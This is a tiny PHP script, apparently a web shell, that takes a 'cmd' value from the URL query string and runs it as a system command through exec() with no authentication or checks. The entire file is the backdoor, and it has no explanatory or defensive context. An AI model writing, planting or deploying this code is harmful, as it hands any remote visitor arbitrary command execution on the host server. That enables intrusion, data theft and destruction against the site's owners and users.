<?php
if (isset($_GET['cmd'])) {
    exec($_GET['cmd']);
}
